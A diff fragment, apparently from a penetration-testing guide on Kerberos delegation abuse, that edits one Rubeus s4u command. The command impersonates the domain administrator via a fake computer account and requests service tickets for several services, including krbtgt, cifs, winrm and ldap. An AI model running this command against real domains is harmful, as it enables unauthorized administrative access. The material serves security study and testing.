@@ -85,7 +85,7 @@ Note that users has an attribute called "**Cannot be delegated**". If a user has
 You can generate more tickets just asking once using the `/altservice` param of Rubeus:
 
 ```bash
-rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:cifs,time,host,http,winrm,rpcss,ldap /domain:domain.local /ptt
+rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 
 ### Accessing
